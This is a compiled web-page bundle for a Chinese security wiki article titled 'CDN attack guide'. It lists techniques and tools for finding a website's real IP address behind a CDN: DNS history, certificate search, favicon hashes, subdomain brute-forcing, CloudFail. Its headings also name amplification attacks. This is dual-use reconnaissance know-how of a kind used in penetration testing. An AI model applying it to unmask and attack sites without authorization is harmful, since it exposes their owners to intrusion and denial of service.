noreferrer"},Q=(0,e.Lk)("h4",{id:"whoisxmlapi",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#whoisxmlapi"},[(0,e.Lk)("span",null,"Whoisxmlapi")])],-1),nn={href:"https://reverse-ip.whoisxmlapi.com/%EF%BC%89",target:"_blank",rel:"noopener noreferrer"},sn=(0,e.Lk)("h4",{id:"dnsdb",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#dnsdb"},[(0,e.Lk)("span",null,"Dnsdb")])],-1),an={href:"https://dnsdb.io/%EF%BC%89",target:"_blank",rel:"noopener noreferrer"},en=(0,e.Lk)("h4",{id:"subdomaintools",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#subdomaintools"},[(0,e.Lk)("span",null,"SubDomainTools")])],-1),tn={href:"https://ruo.me/sub%EF%BC%89",target:"_blank",rel:"noopener noreferrer"},ln=(0,e.Lk)("h4",{id:"fofa",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#fofa"},[(0,e.Lk)("span",null,"FOFA")])],-1),on=(0,e.Lk)("s",null,"https://fofa.so/",-1),pn={href:"https://fofa.info/",target:"_blank",rel:"noopener noreferrer"},rn=(0,e.Lk)("h4",{id:"zoomeye",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#zoomeye"},[(0,e.Lk)("span",null,"Zoomeye")])],-1),cn={href:"https://www.zoomeye.org/",target:"_blank",rel:"noopener noreferrer"},dn={href:"https://www.zoomeye.hk/discover",target:"_blank",rel:"noopener noreferrer"},un=(0,e.Lk)("h4",{id:"脚本工具",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#脚本工具"},[(0,e.Lk)("span",null,"脚本工具")])],-1),kn={href:"https://github.com/lijiejie/subDomainsBrute",target:"_blank",rel:"noopener noreferrer"},hn={href:"https://github.com/FeeiCN/ESD",target:"_blank",rel:"noopener noreferrer"},mn={href:"https://fahai.org/shsb/25.html",target:"_blank",rel:"noopener noreferrer"},vn={href:"https://github.com/FidStyle/fahai",target:"_blank",rel:"noopener noreferrer"},bn={href:"https://fahai.joytion.cn/index.html",target:"_blank",rel:"noopener noreferrer"},gn={href:"https://github.com/chaitin/xray",target:"_blank",rel:"noopener noreferrer"},fn=(0,e.Lk)("p",null,"xray 是一款强大的安全评估工具，一款自动化扫描器，我们可以用其自带的 subdomain 子域名发掘功能来针对性探测。",-1),Ln={href:"https://github.com/vincentcox/bypass-firewalls-by-DNS-history",target:"_blank",rel:"noopener noreferrer"},Nn=(0,e.Lk)("p",null,"Bypass-firewalls-by-DNS-history 是一款集成全自动化的探测工具，通过探测 DNS 历史记录，搜索旧的 DNS A Record，收集子域，并检查服务器是否对该域名进行答复。 另外它还基于源服务器和防火墙在 HTML 响应中的相似性阈值来判断。",-1),wn=(0,e.Lk)("strong",null,"virtual-host 碰撞",-1),Cn={href:"https://github.com/jobertabma/virtual-host-discovery",target:"_blank",rel:"noopener noreferrer"},yn=(0,e.Lk)("p",null,"在线工具",-1),Dn={href:"https://pentest-tools.com/information-gathering/find-virtual-hosts",target:"_blank",rel:"noopener noreferrer"},Sn={href:"https://github.com/m0rtem/CloudFail",target:"_blank",rel:"noopener noreferrer"},Wn={href:"https://suip.biz/?act=cloudfail",target:"_blank",rel:"noopener noreferrer"},xn=(0,e.Lk)("h2",{id:"绑定本地域名解析",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#绑定本地域名解析"},[(0,e.Lk)("span",null,"绑定本地域名解析")])],-1),Fn=(0,e.Lk)("p",null,"找到真实 IP 后如何使用：",-1),Pn=(0,e.Lk)("ul",null,[(0,e.Lk)("li",null,"通过修改 hosts 文件，将域名和 IP 绑定。"),(0,e.Lk)("li",null,"如使用 burpsuite 测试，可以在 Project options --\x3e Connections --\x3e Hostname Resolution 中增加域名和 IP 记录。")],-1),An=(0,e.Lk)("h2",{id:"前人栽树",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#前人栽树"},[(0,e.Lk)("span",null,"前人栽树")])],-1),In={href:"https://github.com/bin-maker/BYPASS-CDN",target:"_blank",rel:"noopener noreferrer"},_n={},En=(0,a(7708).A)(_n,[["render",function(n,s){const a=(0,e.g2)("ExternalLinkIcon");return(0,e.uX)(),(0,e.CE)("div",null,[u,k,(0,e.Lk)("p",null,[(0,e.Lk)("a",h,[(0,e.eW)("CDN"),(0,e.bF)(a)]),(0,e.eW)(" 是内容分发网络（Content Delivery Network）的缩写。它是由一系列分布在全球不同地理位置的服务器网络组成的，其主要目标是提高网站的性能和可用性。")]),m,v,(0,e.Lk)("ul",null,[(0,e.Lk)("li",null,[(0,e.Lk)("a",b,[(0,e.eW)("什么是 CDN 的工作原理_使用 CDN 服务器的好处 | Cloudflare (cloudflare-cn.com)"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",g,[(0,e.eW)("什么是 CDN？- 内容分发网络简介 - AWS (amazon.com)"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",f,[(0,e.eW)("也许是史上最全的一次 CDN 详解 - 知乎 (zhihu.com)"),(0,e.bF)(a)])])]),L,(0,e.Lk)("ul",null,[(0,e.Lk)("li",null,[(0,e.Lk)("a",N,[(0,e.eW)("https://www.itdog.cn/ping/"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",w,[(0,e.eW)("https://tool.chinaz.com/speedworld/"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",C,[(0,e.eW)("https://www.host-tracker.com/v3/check/"),(0,e.bF)(a)])])]),y,(0,e.Lk)("p",null,[(0,e.eW)("另一种绕过 CDN 的方法是使用"),D,(0,e.eW)("。如果我们能够找到网站之前使用过的 IP 地址，就可以尝试直接访问这些 IP 地址，从而绕过 CDN。有些工具可以帮助我们查找网站过去的 DNS 解析记录，比如 "),(0,e.Lk)("a",S,[(0,e.eW)("Censys"),(0,e.bF)(a)]),(0,e.eW)("、"),(0,e.Lk)("a",W,[(0,e.eW)("Shodan"),(0,e.bF)(a)]),(0,e.eW)("、"),(0,e.Lk)("a",x,[(0,e.eW)("微步社区的资产测绘"),(0,e.bF)(a)]),(0,e.eW)("等")]),F,(0,e.Lk)("p",null,[(0,e.eW)("例如 "),P,(0,e.eW)("​ ，项目地址："),(0,e.Lk)("a",A,[(0,e.eW)("https://github.com/christophetd/CloudFlair"),(0,e.bF)(a)])]),I,_,(0,e.Lk)("p",null,[(0,e.eW)("可以通过 "),(0,e.Lk)("a",E,[(0,e.eW)("https://crt.sh"),(0,e.bF)(a)]),(0,e.eW)(" 进行快速证书查询收集。")]),M,(0,e.Lk)("ul",null,[T,(0,e.Lk)("li",null,[(0,e.eW)("该图标数据通常是从 "),(0,e.Lk)("a",q,[(0,e.eW)("https://anywebsite/favicon.ico"),(0,e.bF)(a)]),(0,e.eW)(" 处获取的，浏览器会在浏览任何网站时自动请求它。")]),z]),B,(0,e.Lk)("p",null,[(0,e.eW)("SecurityTrails （"),(0,e.Lk)("a",X,[(0,e.eW)("https://securitytrails.com/"),(0,e.bF)(a)]),(0,e.eW)(" 前身为 DNS Trails）拥有大约 3.5 万亿 DNS 记录，3 亿 whois 记录，8 亿 SSL 证书记录以及超过 4.5 亿子域的记录数据。自 2008 年以来，网站每天都收集和更新海量数据。")]),R,O,j,(0,e.Lk)("p",null,[(0,e.eW)("Complete DNS（"),(0,e.Lk)("a",H,[(0,e.eW)("https://completedns.com/）"),(0,e.bF)(a)]),(0,e.eW)("拥有超过 22 亿个 DNS 变更记录，提供 API，支持同时进行多域名/IP 查询。")]),U,(0,e.Lk)("p",null,[(0,e.eW)("WhoISrequest （"),(0,e.Lk)("a",G,[(0,e.eW)("https://whoisrequest.com/）"),(0,e.bF)(a)]),(0,e.eW)("这个网站自 2002 年以来一直在跟踪和记录 DNS 历史变更，数据底蕴很足。")]),K,(0,e.Lk)("p",null,[(0,e.eW)("Whoxy（"),(0,e.Lk)("a",J,[(0,e.eW)("https://www.whoxy.com/）"),(0,e.bF)(a)]),(0,e.eW)("拥有爬取超过 3.65 亿个子域数据，该网站 API 调用非常方便，以 XML 和 JSON 格式返回数据。")]),V,(0,e.Lk)("p",null,[(0,e.eW)("Netcraft（"),(0,e.Lk)("a",$,[(0,e.eW)("https://netcraft.com/）"),(0,e.bF)(a)]),(0,e.eW)("不用多说了吧，很多人都知道，不过仁者见仁智者见智吧，经过时代的变迁，Netcraft 也不是曾经的那个少年了，这里只是提一下，仅供参考。")]),Y,(0,e.Lk)("p",null,[(0,e.eW)("Viewdns（"),(0,e.Lk)("a",Z,[(0,e.eW)("https://viewdns.info/）"),(0,e.bF)(a)]),(0,e.eW)("可以说是非常的简洁直观了，就算你不懂任何英文，我相信你也看的懂，至少你知道在哪里输入对吧。响应速度也是非常快了，首页一目了然，集成了超多的查询功能。")]),Q,(0,e.Lk)("p",null,[(0,e.eW)("Whoisxmlapi（"),(0,e.Lk)("a",nn,[(0,e.eW)("https://reverse-ip.whoisxmlapi.com/）"),(0,e.bF)(a)]),(0,e.eW)("数据库包含了超过 1.4 亿多个域名生态数据，用来反查 IP 和 DNS 数据，在绕过 CDN 时候做反向对比非常有用。网站和 whoxy 一样，也是以 XML 和 JSON 格式返回数据，支持自定义。")]),sn,(0,e.Lk)("p",null,[(0,e.eW)("Dnsdb（"),(0,e.Lk)("a",an,[(0,e.eW)("https://dnsdb.io/）"),(0,e.bF)(a)]),(0,e.eW)("功能非常强大，老平台了，也是我常用平台之一。")]),en,(0,e.Lk)("p",null,[(0,e.eW)("SubDomainTools（"),(0,e.Lk)("a",tn,[(0,e.eW)("https://ruo.me/sub）"),(0,e.bF)(a)]),(0,e.eW)("在线子域名查询，支持实时模式和后台模式，不阻塞前端线程，不占 CPU，小测试的时候非常方便。")]),ln,(0,e.Lk)("p",null,[(0,e.eW)("FOFA（"),on,(0,e.eW)(" 时代变了："),(0,e.Lk)("a",pn,[(0,e.eW)("https://fofa.info/"),(0,e.bF)(a)]),(0,e.eW)("）可以迅速进行网站资产匹配，加快后续工作进程，如漏洞影响范围分析，应用分布统计，应用流行度排名统计等。FOFA 非常友好，即使免费，也可以查询足够多的数据量，只要你不是商用或者大需求用户，是不需要开会员的。")]),rn,(0,e.Lk)("p",null,[(0,e.Lk)("a",cn,[(0,e.eW)("Zoomeye"),(0,e.bF)(a)]),(0,e.eW)(" 钟馗之眼，知道创宇打造的宇宙级网络空间搜索引擎，Shodan 侧重于主机设备，"),(0,e.Lk)("a",dn,[(0,e.eW)("Zoomeye"),(0,e.bF)(a)]),(0,e.eW)(" 则偏向于 Web 发现。")]),un,(0,e.Lk)("ul",null,[(0,e.Lk)("li",null,[(0,e.Lk)("p",null,[(0,e.Lk)("a",kn,[(0,e.eW)("https://github.com/lijiejie/subDomainsBrute"),(0,e.bF)(a)])])]),(0,e.Lk)("li",null,[(0,e.Lk)("p",null,[(0,e.Lk)("a",hn,[(0,e.eW)("https://github.com/FeeiCN/ESD"),(0,e.bF)(a)])])]),(0,e.Lk)("li",null,[(0,e.Lk)("p",null,[(0,e.eW)("Layer 子域名挖掘机，"),(0,e.Lk)("a",mn,[(0,e.eW)("宴席终将散场，然而人生仍在继续 - 法海之路 (fahai.org)"),(0,e.bF)(a)])]),(0,e.Lk)("p",null,[(0,e.Lk)("a",vn,[(0,e.eW)("GitHub - FidStyle/fahai: mirror site for fahai.org"),(0,e.bF)(a)])]),(0,e.Lk)("p",null,[(0,e.Lk)("a",bn,[(0,e.eW)("法海之路 (joytion.cn)"),(0,e.bF)(a)])])]),(0,e.Lk)("li",null,[(0,e.Lk)("p",null,[(0,e.Lk)("a",gn,[(0,e.eW)("https://github.com/chaitin/xray"),(0,e.bF)(a)])]),fn]),(0,e.Lk)("li",null,[(0,e.Lk)("p",null,[(0,e.Lk)("a",Ln,[(0,e.eW)("https://github.com/vincentcox/bypass-firewalls-by-DNS-history"),(0,e.bF)(a)])]),Nn]),(0,e.Lk)("li",null,[(0,e.Lk)("p",null,[wn,(0,e.eW)("：自动化的过程可以使用 virtual-host-discovery 工具，项目地址："),(0,e.Lk)("a",Cn,[(0,e.eW)("https://github.com/jobertabma/virtual-host-discovery"),(0,e.bF)(a)])]),yn,(0,e.Lk)("p",null,[(0,e.Lk)("a",Dn,[(0,e.eW)("任何 IP 地址的虚拟主机发现 - Pentest-Tools.com --- Virtual host discovery for any IP address - Pentest-Tools.com"),(0,e.bF)(a)])])]),(0,e.Lk)("li",null,[(0,e.Lk)("p",null,[(0,e.Lk)("a",Sn,[(0,e.eW)("GitHub - m0rtem/CloudFail: Utilize misconfigured DNS and old database records to find hidden IP's behind the CloudFlare network"),(0,e.bF)(a)])]),(0,e.Lk)("p",null,[(0,e.eW)("在线版本："),(0,e.Lk)("a",Wn,[(0,e.eW)("Service to find hidden IP's behind the CloudFlare network (suip.biz)"),(0,e.bF)(a)])])])]),xn,Fn,Pn,An,(0,e.Lk)("ul",null,[(0,e.Lk)("li",null,[(0,e.Lk)("a",In,[(0,e.eW)("GitHub - bin-maker/BYPASS-CDN"),(0,e.bF)(a)])])])])}]]),Mn=JSON.parse('{"path":"/websec/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/CDN%20%E6%94%BB%E5%87%BB%E6%8C%87%E5%8D%97.html","title":"CDN 攻击指南","lang":"zh-CN","frontmatter":{"title":"CDN 攻击指南","description":"​image​ 什么是 CDN CDN 是内容分发网络（Content Delivery Network）的缩写。它是由一系列分布在全球不同地理位置的服务器网络组成的，其主要目标是提高网站的性能和可用性。 CDN 通过将内容缓存到分布在全球各地的边缘节点上，使用户能够从离他们更近的服务器获取内容（包括 HTML 网页、JavaScript 文件、样式表...","head":[["meta",{"property":"og:url","content":"https://github.com/zha0cai/SecWikiPublic/secwiki/websec/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/CDN%20%E6%94%BB%E5%87%BB%E6%8C%87%E5%8D%97.html"}],["meta",{"property":"og:site_name","content":"One-Piece"}],["meta",{"property":"og:title","content":"CDN 攻击指南"}],["meta",{"property":"og:description","content":"​image​ 什么是 CDN CDN 是内容分发网络（Content Delivery Network）的缩写。它是由一系列分布在全球不同地理位置的服务器网络组成的，其主要目标是提高网站的性能和可用性。 CDN 通过将内容缓存到分布在全球各地的边缘节点上，使用户能够从离他们更近的服务器获取内容（包括 HTML 网页、JavaScript 文件、样式表..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"Mr.zha0cai"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"CDN 攻击指南\\",\\"image\\":[\\"\\"],\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Mr.zha0cai\\",\\"url\\":\\"https://github.com/zha0cai\\"}]}"]]},"headers":[{"level":2,"title":"什么是 CDN","slug":"什么是-cdn","link":"#什么是-cdn","children":[]},{"level":2,"title":"判断 CDN","slug":"判断-cdn","link":"#判断-cdn","children":[{"level":3,"title":"多地 Ping","slug":"多地-ping","link":"#多地-ping","children":[]},{"level":3,"title":"nslookup","slug":"nslookup","link":"#nslookup","children":[]},{"level":3,"title":"其他","slug":"其他","link":"#其他","children":[]}]},{"level":2,"title":"绕过 CDN","slug":"绕过-cdn","link":"#绕过-cdn","children":[{"level":3,"title":"子域名辅助查询","slug":"子域名辅助查询","link":"#子域名辅助查询","children":[]},{"level":3,"title":"历史 DNS 解析记录","slug":"历史-dns-解析记录","link":"#历史-dns-解析记录","children":[]},{"level":3,"title":"大数据检索","slug":"大数据检索","link":"#大数据检索","children":[]},{"level":3,"title":"国外主机解析","slug":"国外主机解析","link":"#国外主机解析","children":[]},{"level":3,"title":"通过 SSL 证书","slug":"通过-ssl-证书","link":"#通过-ssl-证书","children":[]},{"level":3,"title":"通过 F5 LTM 解码","slug":"通过-f5-ltm-解码","link":"#通过-f5-ltm-解码","children":[]},{"level":3,"title":"通过 XML-RPC PINGBACK 通信","slug":"通过-xml-rpc-pingback-通信","link":"#通过-xml-rpc-pingback-通信","children":[]},{"level":3,"title":"通过 favicon.ico 哈希特征","slug":"通过-favicon-ico-哈希特征","link":"#通过-favicon-ico-哈希特征","children":[]},{"level":3,"title":"通过流量耗尽、流量放大攻击（不建议使用）","slug":"通过流量耗尽、流量放大攻击-不建议使用","link":"#通过流量耗尽、流量放大攻击-不建议使用","children":[]},{"level":3,"title":"在线平台","slug":"在线平台","link":"#在线平台","children":[]}]},{"level":2,"title":"绑定本地域名解析","slug":"绑定本地域名解析","link":"#绑定本地域名解析","children":[]},{"level":2,"title":"前人栽树","slug":"前人栽树","link":"#前人栽树","children":[]}],"git":{"createdTime":null,"updatedTime":null,"contributors":[]},"readingTime":{"minutes":14.98,"words":4495},"filePathRelative":"websec/基础知识/CDN 攻击指南.md","autoDesc":true}')}}]);